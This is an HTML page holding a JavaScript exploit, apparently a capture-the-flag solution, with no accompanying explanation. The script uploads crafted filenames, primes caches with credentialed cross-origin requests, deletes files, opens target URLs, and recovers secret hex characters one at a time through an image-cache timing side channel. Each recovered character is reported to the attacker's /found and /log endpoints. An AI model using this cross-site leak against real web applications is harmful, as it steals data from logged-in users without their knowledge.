<html>
    <body>
        <script>


           const url = ""
           const blob = new Blob(['a'], {type: "image/png"})
           const data = new FormData()
           const caches = Array.from({length: 18}, (_, i) => i+1).map(x => x.toString())
           const lens = { 4: 'AAAA',8: 'AAAAAAA', 6: 'AAAAAAAA', 12: 'AAAAAAAAAA', 10: 'AAAAAAAAAAA', 16: 'AAAAAAAAAAAAA', 14: 'AAAAAAAAAAAAAA', 20: 'AAAAAAAAAAAAAAAA', 18: 'AAAAAAAAAAAAAAAAA', 24: 'AAAAAAAAAAAAAAAAAAA', 22: 'AAAAAAAAAAAAAAAAAAAA', 28: 'AAAAAAAAAAAAAAAAAAAAAA', 26: 'AAAAAAAAAAAAAAAAAAAAAAA', 32: 'AAAAAAAAAAAAAAAAAAAAAAAAA', 30: 'AAAAAAAAAAAAAAAAAAAAAAAAAA', 36: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAA', 34: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAA', 38: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'}
           const all_hex_pairs = Array.from({length: 256}, (_, i) => i.toString(16).padStart(2, '0'))
           let  img_url 

           const log = async(msg) => {
            fetch("/log?val="+encodeURIComponent(msg))
           }
           const found_log = async(chr) => {
            fetch("/found?val="+encodeURIComponent(chr))
           }

            const sleep = (ms) => {
              return new Promise(resolve => setTimeout(resolve, ms));
            }
           function cache_set(key,range) {
            
              return new Promise((resolve, reject) => {
                fetch(url + '/files.js?'+key, {
                        headers: {
                        "Range":range,
                            "Accept" :"appplication/json"
                          
                        },
                      credentials: "include",
                      mode : "cors"
              })
                  .then(response => {
                    resolve()
                  })
                  .catch(error => {
                    resolve()
                  });
              });
            }


          async function check_cache(image,i) {     
              const now = performance.now()
              const img = document.createElement('img')
              img.onload = () => {
              const end = performance.now()
              fetch(`/log?url=${image}&start=${now}&end=${end}&ms=${end-now}`)
              check(image,i+1)
              }
            img.src = image
            document.body.appendChild(img)

          } 

          async function load_and_check(url){
            var img = new Image();
            img.src = url;
            await new Promise(r=>setTimeout(r,20));
            return img.complete;
          }

        async function check(key,part) {  
          for (let i = 64*(part); i < 64*(part+1); i++) {
            res = await load_and_check(img_url+"?"+key+all_hex_pairs[i])
            //log("Checked: "+key+all_hex_pairs[i]+"res="+res)
            if(!res)
            {
              await found_log(all_hex_pairs[i])
              return true
              break
            }

          }
          return false
         }  
     

          const upload = async(data) =>{
                await fetch(url + '/upload', {
              method: 'POST',
              mode : "no-cors",
              credentials : "include",
              body: data
            });
          }
          const delete_file = async(filename) =>{
            return new Promise((resolve, reject) => {
                fetch(url + '/delete?file=' + filename, {
                    method: 'GET',
                    mode:"no-cors",
                    credentials: "include"
                  }).then(response => {
                    resolve()
                  }).catch(error => {
                    resolve()
                  });
              });
          }
         

        main = async() =>{
            img_url = await fetch('/image').then(response => response.text())
          
            data.append('file',blob , 'flag.png')
            await upload(data)

            for (let i = 0; i < 7; i++) {
              data.set('file',blob , `?${String.fromCharCode(98+i)}?`.repeat(85))
              await upload(data)
            }

            data.set('file',blob , 'A'.repeat(240))
            await upload(data)
            data.set('file',blob , 'A'.repeat(30)+"?A?")
            await upload(data)
            for (let i = 0; i<caches.length; i++) {
              await cache_set(caches[i],"bytes=0-4095")
            }
            await delete_file('A'.repeat(30)+"?A?")
            
            j=0
            for (let i = 4; i<=38; i+=2) {
              data.set('file',blob , lens[i])
              await upload(data)
              await cache_set(caches[j++],"bytes=4096-4099")
              await delete_file(lens[i])
              
            }

           
            data.set('file',blob , "A".repeat(255))
            await upload(data)
            w = window.open("about:blank")
            for (let i = 0; i<caches.length; i++) {
              svg_urls = await fetch('/get?key='+caches[i]).then(response => response.text())
              svg_urls = svg_urls.split(",")
              for (let j = 0; j < svg_urls.length; j++) {
                log("opening: "+svg_urls[j])
                w.location = svg_urls[j]+"?"+caches[i]
                await sleep(2000)
                found = await check(caches[i],j)
                if(found)
                {
                  break
                }
              }
              
            }
   
        }
        main()

        </script>
        <img src="" />
    </body>
</html>